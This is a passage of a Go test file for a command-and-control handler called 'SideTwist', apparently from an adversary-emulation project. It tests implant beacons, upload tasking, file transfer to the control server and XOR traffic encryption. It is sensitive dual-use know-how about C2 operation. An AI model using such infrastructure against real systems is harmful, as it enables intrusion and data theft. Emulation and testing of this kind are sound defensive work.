		t.Errorf("Expected empty file bytes, received %v", fileData)
	}
	if err == nil {
		t.Error("Expected error, received none")
	} else if err.Error() != want {
		t.Errorf("Expected error message %s; got %s", want, err.Error())
	}
}

func TestDownloadFile(t *testing.T) {
	// set current working directory to main repo directory
	// this is needed so that the unit tests can find the requested payload
	cwd, _ := os.Getwd()
	os.Chdir("../../")
	defer os.Chdir(cwd) // restore cwd at end of test

	// start REST API
	startRESTAPI(t)
	defer stopRESTAPI(t)

	// start handler
	handler := sideTwistHandlerFactory(basicResponseWrapper, defaultHtmlTemplatePath, xorEncrypt, xorEncrypt)
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)

	// download the test file
	url := getFileURL + "/" + "hello_world.elf"
	resp, err := http.Get(url)
	if err != nil {
		t.Error(err)
	}
	defer resp.Body.Close()
	// read test file bytes
	encodedData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		t.Error(err)
	}
	fileData, err := handler.decodeAndDecrypt(string(encodedData))
	if err != nil {
	       t.Error(err)
	}
	
	// compare file hashes
	h := md5.Sum(fileData)
	actualHash := hex.EncodeToString(h[:])
	if helloWorldElfHash != actualHash {
		t.Errorf("Expected %v, got %v", helloWorldElfHash, actualHash)
	}

	// Test nonexistent file
	url = getFileURL + "/" + "nonexistent.file"
	resp2, err := http.Get(url)
	if err != nil {
		t.Error(err)
	}
	defer resp2.Body.Close()
	if resp2.StatusCode != 500 {
		t.Errorf("Expected error code 500, got %v", resp2.StatusCode)
	}
	body, err := ioutil.ReadAll(resp2.Body)
	if err != nil {
		t.Error(err)
	}
	if string(body) != serverErrMsg {
		t.Errorf("Expected message %s; got %s", serverErrMsg, string(body))
	}
}

func TestForwardUpload(t *testing.T) {
	// set current working directory to main repo directory to access ./files
	cwd, _ := os.Getwd()
	os.Chdir("../../")
	defer os.Chdir(cwd) // restore cwd at end of test

	// start REST API
	startRESTAPI(t)
	defer stopRESTAPI(t)

	// start handler
	handler := sideTwistHandlerFactory(basicResponseWrapper, defaultHtmlTemplatePath, xorEncrypt, xorEncrypt)
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)

	testFile := "./test_payloads/hello_world.elf"
	fileNameOnUpload := "test_binary_sidetwist.elf"
	fileData, err := ioutil.ReadFile(testFile)
	if err != nil {
		t.Error(err)
	}

	// invoke file upload
	got, err := handler.forwardUpload(fileNameOnUpload, fileData)
	if err != nil {
		t.Error(err)
	}
	uploadedFile := "./files/" + fileNameOnUpload
	defer cleanupFile(t, uploadedFile)
	
	// validate response
	want := "Successfully uploaded file to control server at './files/test_binary_sidetwist.elf'\n"
	if got != want {
		t.Errorf("Expected '%v' got '%v'", want, got)
	}

	// confirm file made it to disk properly
	// read test file bytes
	uploadedFileData, err := ioutil.ReadFile(uploadedFile)
	if err != nil {
		t.Error(err)
	}
	
	// compare file hashes
	h := md5.Sum(uploadedFileData)
	actualHash := hex.EncodeToString(h[:])
	if helloWorldElfHash != actualHash {
		t.Errorf("Expected %v, got %v", helloWorldElfHash, actualHash)
	}
}

func TestPostFileToServer(t *testing.T) {
	// set current working directory to main repo directory to access ./files
	cwd, _ := os.Getwd()
	os.Chdir("../../")
	defer os.Chdir(cwd) // restore cwd at end of test

	// start REST API
	startRESTAPI(t)
	defer stopRESTAPI(t)

	// start handler
	handler := sideTwistHandlerFactory(basicResponseWrapper, defaultHtmlTemplatePath, xorEncrypt, xorEncrypt)
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)

	// read file to upload
	testFile := "./test_payloads/hello_world.elf"
	testFileName := "test_binary_sidetwist1.elf"
	testFileName2 := "test_binary_sidetwist2.elf"
	testFileName3 := "test_binary_sidetwist3.elf"
	fileData, err := ioutil.ReadFile(testFile)
	if err != nil {
		t.Error(err)
	}
	
	// build upload data package
	encodedContents := handler.encryptAndEncode(fileData)
	toSend, _ := json.Marshal(map[string]string{"1": encodedContents})
	toSend2, _ := json.Marshal(map[string]string{"2": encodedContents})
	toSend3, _ := json.Marshal(map[string]string{"3": encodedContents})
	
	// submit upload without tasking. error expected
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, toSend, serverErrMsg, 500)
	
	// Send Beacon to establish session. Expecting empty task response.
	body := sendImplantBeacon(t, exampleBeacon.GUID)
	if string(body) != emptyTaskWant {
		t.Errorf("Got '%s' expected '%s'", string(body), emptyTaskWant)
	}
	
	// make sure session was added
	if !handler.hasImplantSession(exampleBeacon.GUID) {
		t.Error("Expected session to be stored in handler.")
	}
	
	// send upload task (just filename)
	setAndGetTask(t, fmt.Sprintf("103 %s", testFileName), exampleBeacon.GUID)
	sendImplantBeacon(t, exampleBeacon.GUID)
	
	// perform upload
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, toSend, "", 200)
	
	// confirm file made it to disk properly
	// read test file bytes
	uploadedFile := "./files/" + testFileName
	defer cleanupFile(t, uploadedFile)
	
	uploadedFileData, err := ioutil.ReadFile(uploadedFile)
	if err != nil {
		t.Error(err)
	}
	
	// compare file hashes
	h := md5.Sum(uploadedFileData)
	actualHash := hex.EncodeToString(h[:])
	if helloWorldElfHash != actualHash {
		t.Errorf("Expected %v, got %v", helloWorldElfHash, actualHash)
	}

	// send upload task (full path)
	setAndGetTask(t, fmt.Sprintf("103 C:\\path\\%s", testFileName2), exampleBeacon.GUID)
	sendImplantBeacon(t, exampleBeacon.GUID)
	
	// perform upload
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, toSend2, "", 200)
	
	// confirm file made it to disk properly
	// read test file bytes
	uploadedFile2 := "./files/" + testFileName2
	defer cleanupFile(t, uploadedFile2)
	
	uploadedFileData, err = ioutil.ReadFile(uploadedFile2)
	if err != nil {
		t.Error(err)
	}
	
	// compare file hashes
	h = md5.Sum(uploadedFileData)
	actualHash = hex.EncodeToString(h[:])
	if helloWorldElfHash != actualHash {
		t.Errorf("Expected %v, got %v", helloWorldElfHash, actualHash)
	}
	
	// send upload task (full path with quotes)
	setAndGetTask(t, fmt.Sprintf("103 \"C:\\path with spaces\\%s\"", testFileName3), exampleBeacon.GUID)
	sendImplantBeacon(t, exampleBeacon.GUID)
	
	// perform upload
	sendOutputAndCheckResponse(t, exampleBeacon.GUID, toSend3, "", 200)
	
	// confirm file made it to disk properly
	// read test file bytes
	uploadedFile3 := "./files/" + testFileName3
	defer cleanupFile(t, uploadedFile3)
	
	uploadedFileData, err = ioutil.ReadFile(uploadedFile3)
	if err != nil {
		t.Error(err)
	}
	
	// compare file hashes
	h = md5.Sum(uploadedFileData)
	actualHash = hex.EncodeToString(h[:])
	if helloWorldElfHash != actualHash {
		t.Errorf("Expected %v, got %v", helloWorldElfHash, actualHash)
	}
}

func cleanupFile(t *testing.T, uploadedFile string) {
	// clean up test file
	err := os.Remove(uploadedFile)
	if err != nil {
		t.Error(err)
	}
}

func TestGetLeaf(t *testing.T) {
	want := "filename.txt"
	got := getLeaf("filename.txt")
	if want != got {
		t.Errorf("Expected %s, got %s", want, got)
	}
	got = getLeaf("C:\\dir\\path\\filename.txt")
	if want != got {
		t.Errorf("Expected %s, got %s", want, got)
	}
	got = getLeaf("\"C:\\dir\\path with spaces\\filename.txt\"")
	if want != got {
		t.Errorf("Expected %s, got %s", want, got)
	}
}

func TestFetchLogo(t *testing.T) {
	// set current working directory to main repo directory to access files
	cwd, _ := os.Getwd()
	os.Chdir("../../")
	defer os.Chdir(cwd) // restore cwd at end of test

	
	// start handler
	handler := sideTwistHandlerFactory(basicResponseWrapper, defaultHtmlTemplatePath, xorEncrypt, xorEncrypt)
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)
	
	response, err := http.Get(logoURL)
	if err != nil {
		t.Error(err)
	}
	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		t.Error(err)
	}
	
	h := md5.Sum(body)
	actualHash := hex.EncodeToString(h[:])
	if logoHash != actualHash {
		t.Errorf("Expected %v, got %v", logoHash, actualHash)
	}
}

func TestEncryptionAndEncoding(t *testing.T) {
	// start handler
	handler := sideTwistHandlerFactory(basicResponseWrapper, templatePath, xorEncrypt, xorEncrypt)
	startSideTwistHandler(handler, t)
	defer stopSideTwistHandler(handler, t)
	
	input := "short"
	want := "HQcbHxE="
	encOutput := handler.encryptAndEncode([]byte(input))
	if encOutput != want {
		t.Errorf("Expected %s, got %s", want, encOutput)
	}
	decOutput, err := handler.decodeAndDecrypt(want)
	if err != nil {
		t.Error(err)
	}
	if string(decOutput) != input {
		t.Errorf("Expected %s, got %s", input, string(decOutput))
	}
	
	input = "thisisasuperlongstrthisisasuperlongstrthisisasuperlongstrthisisasuperlongstrthisisasuperlongstrthisisasuperlongstrthisisasuperlongstr"
	want = "GgcdHgwBEhYbHgAcAxsDAgEHFxoGDB0GBwwWBwMAHAIKAAgHGRcGGwwdBxYPHAEdAAAfCgAJFhodAAUMARoWDx0QHgoGAQocFBYaHBEGBgcEFhMAEB4LFwIAGgoWBgERBgcWBxwVHhACFhcCAQsJHAAfERoaFgcdBB0aBAgXHhwLCR0RHA=="
	encOutput = handler.encryptAndEncode([]byte(input))
	if encOutput != want {
		t.Errorf("Expected %s, got %s", want, encOutput)
	}
	decOutput, err = handler.decodeAndDecrypt(want)
	if err != nil {
		t.Error(err)
	}
	if string(decOutput) != input {
		t.Errorf("Expected %s, got %s", input, string(decOutput))
	}
}
